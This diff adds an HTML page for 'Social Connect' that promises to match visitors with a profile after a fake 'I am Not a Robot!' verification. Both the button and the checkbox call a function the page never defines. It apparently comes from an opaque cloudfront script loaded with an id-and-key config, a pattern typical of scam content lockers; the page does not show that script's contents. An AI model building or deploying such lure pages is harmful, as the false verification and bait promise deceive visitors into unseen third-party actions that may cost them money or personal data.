@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Complete verification to connect with your match">
+    <title>Verification Required - Social Connect</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/verify.css">
+</head>
+<body>
+    <div class="verification-container">
+        <div class="card shadow-lg">
+            <div class="card-body text-center p-4">
+                <h1 class="mb-4">One Last Step!</h1>
+                <p class="lead mb-4">Before we connect you with a profile, please complete this quick human verification process.</p>
+                
+                <div class="verification-box mb-4">
+                    <div class="checkbox-wrapper-26">
+                        <input type="checkbox" id="_checkbox-26" onclick="_om()" required>
+                        <label for="_checkbox-26">
+                            <div class="tick_mark"></div>
+                        </label>
+                    </div>
+                    <button class="btn btn-danger btn-lg mt-3" onclick="_om()">I am Not a Robot!</button>
+                </div>
+                
+                <div class="note-box p-3 bg-light rounded">
+                    <p class="mb-0">Once verified, we'll match you with a profile and send the connection details to your email.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="loader">
+        <div class="spinner-border text-primary" role="status">
+            <span class="visually-hidden">Loading...</span>
+        </div>
+    </div>
+
+    <script type="text/javascript">
+        var idSli_AWj_YQScwc={"it":4437264,"key":"160cc"};
+    </script>
+    <script src="https://d2v7l2267atlz5.cloudfront.net/47da6a4.js"></script>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <script>
+        window.addEventListener("load", () => {
+            const loader = document.querySelector(".loader");
+            setTimeout(() => {
+                loader.style.display = 'none';
+            }, 1500);
+        });
+    </script>
+</body>
+</html>
